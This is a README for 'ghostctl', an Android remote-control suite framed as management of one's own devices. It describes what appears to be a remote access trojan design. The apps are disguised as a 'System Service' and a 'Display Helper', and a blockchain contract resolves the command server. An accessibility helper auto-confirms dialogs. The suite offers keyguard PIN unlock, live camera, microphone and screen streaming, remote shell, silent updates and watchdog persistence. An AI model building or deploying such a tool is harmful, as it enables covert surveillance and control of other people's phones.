# ghostctl — Personal Android Device Management Suite

ghostctl lets you manage **your own Android devices remotely**: check battery and
status, transfer files, run diagnostics, capture the screen for support or
demos, control media, and automate repetitive UI taps — all from a small
self-hosted server you control.

Typical uses:

- Helping family members with their phones (see the screen, tap through
  menus for them, adjust settings they can't find)
- Monitoring and administering your own devices (battery, storage, files)
- Automated UI testing of other apps (dump the accessibility tree, tap, type)
- Running diagnostics on a device fleet you own

Everything is built around **explicit enrollment and manual approval**: a device
only joins your server after someone installs the app on it and enters setup,
and *you* personally approve each device before any command reaches it.

---

## Architecture

Three components:

| Component | Path | What it is |
|---|---|---|
| **ghostd** ("System Service") | `client-main/` | Android app installed on each managed device. Foreground service, WebSocket client, all device verbs. |
| **ghosta** ("Display Helper") | `client-sidekick/` | Small helper app on the same device. Accessibility service used for UI automation (dump/tap/type) and dialog auto-confirmation. Talks to ghostd over localhost TCP only. |
| **server** | `server/` | Python daemon (device WebSocket + admin RPC), `ghostctl.py` CLI, and a small web console. |

Deployment flow:

1. Build ghostd (it bundles ghosta as an asset and installs it automatically
   after setup).
2. Run the daemon on your server.
3. Install ghostd on the device, walk the setup wizard (grants the
   permissions the features need), press **Finish**.
4. The device connects, lands in the **pending** list, and you approve it:
   `ghostctl.py approve <device_id>` (CLI or web console).
5. From then on the device is fully manageable and survives reboots.

### Endpoint resolution (no hardcoded server address)

The app reads its server address from a public Polygon smart contract
(`blockchain/` has the deploy/update/read scripts), so you can move or
re-point the server without rebuilding or touching the apps. A cache of the
last good endpoint survives temporary network problems.

### Device authentication

- Every device hello carries an **enrollment key** (shared secret set in
  `server/.env` → `GHOST_ENROLL_KEY`, mirrored in
  `client-main/.../C2Config.kt` → `C2.ENROLL_KEY`). Wrong key = instant
  disconnect.
- New devices land in a **pending** list — they heartbeat but receive no
  commands until you run `approve`.
- Each approved device holds a unique **token**; `revoke <id>` rotates it.
- Flood protection: caps on pending devices and per-IP connections
  (configurable live: `ghostctl.py config set max_pending 50`).

---

## Server setup

```bash
cd server
pip install --user websockets

# settings (loaded at daemon start; also: enroll key, flood caps)
cat .env
#   GHOST_ENROLL_KEY=...   (must match C2.ENROLL_KEY in the app)
#   GHOST_MAX_PENDING=50
#   GHOST_MAX_PER_IP=5

python3 daemon.py          # devices ws://0.0.0.0:8443, admin 127.0.0.1:8444
python3 console.py --host 0.0.0.0   # web console on :9443 (prints a password)
```

Open the firewall for the device port (8443/tcp) and the console port if you
want remote access to it. All admin surfaces are localhost-bound by default.

### CLI (`server/ghostctl.py`)

```text
list | pending | approve <id> | revoke <id> | config [set k v]
-d <id> shell "cmd"                       run a shell command
-d <id> files ls|tree|get|put ...        file browser + transfer
-d <id> screen shot|live|record|stop|off screen capture (MJPEG live)
-d <id> cam snap|live|stop               camera
-d <id> mic record|live|stop             microphone
-d <id> brightness|volume|wake          device controls
-d <id> ui dump|find                     accessibility tree (JSON)
-d <id> tap|longclick|type|key|swipe     UI automation (node-id or x,y)
-d <id> unlock <pin>                      keyguard PIN entry
-d <id> arm|disarm                        sidekick dialog auto-confirmation
-d <id> sidekick status|arm|install      helper app management
-d <id> update self|sidekick              silent OTA updates (hash-verified)
--all <verb> ...                          broadcast to all approved devices
```

Everything outputs JSON (scriptable); `--pretty` for humans.

### Web console (`server/console.py`)

Device list with online status, battery, approval badges, per-device command
forms, broadcast page, and live MJPEG streams at
`/stream/<device>/feed.mjpg`. Approve/revoke buttons on each device page.

---

## Building the apps

Toolchain: JDK 21 + Android SDK + Gradle.

```bash
cd client-sidekick && gradle assembleRelease     # ghosta first
cd client-main   && gradle refreshSidekickAsset   # bundle ghosta into ghostd
cd client-main   && gradle assembleRelease test   # ghostd + unit tests
```

(`refreshSidekickAsset` is a **separate** Gradle invocation — running it in
the same invocation trips Gradle's implicit-dependency check.)

Signing keystore: `keys/ghost.jks` (gitignored).

## Protocol summary (device ↔ server)

JSON over WebSocket (device port 8443):

- `hello` (device_id, model, battery, enroll_key, token?) →
  `hello_ack` (approved | pending | denied, token)
- `ping` → `pong` (45 s heartbeat; the client also force-reconnects if no
  inbound traffic for ~135 s)
- `{"type":"cmd","cmd_id","action","args"}` → `{"type":"result",...}`
- binary frames: `file_chunk` / `file_end` (transfers), MJPEG `frame`
  (live streams)

Full command spec: `PROJECT.md`.

## Reliability design

- **Foreground service** + wake lock + battery-optimization exemption:
  survives Doze and reboots (boot receiver).
- **Connection watchdog**: dead/half-open sockets are detected and recreated
  automatically (no manual restarts after network changes).
- **Self-restart**: if the service can't hold a connection for 10 minutes
  while the network is up, it restarts itself with fresh threads.
- **Babysitter**: ghosta tracks ghostd's localhost heartbeat beacon and
  restarts it if it goes silent for 15 minutes.
- **Restart after update**: `MY_PACKAGE_REPLACED` receiver brings the
  service back after every silent OTA update.
- **File pushes are serialized** and path-verified end to end (SHA-256 +
  size checked on the device; cross-path chunks are ignored).

## Testing

- `client-main`: `gradle test` (45+ JVM unit tests — protocol, transfer,
  version, hello/auth parsing)
- `client-sidekick`: `gradle test` (16 unit tests — command router, tree)
- `server/fake_client.py`: protocol-aware test client (speaks hello/auth,
  streams, file receive) for end-to-end runs against a local daemon
- Manual end-to-end checklist: see PROJECT.md "Testing"

## Repository layout

```text
client-main/     ghostd app (Android)
client-sidekick/ ghosta app (Android)
server/          daemon, CLI, web console, fake client, .env
blockchain/      Polygon contract + deploy/update/read scripts
keys/            signing keystore (gitignored)
PROJECT.md       original design notes + full command spec
```
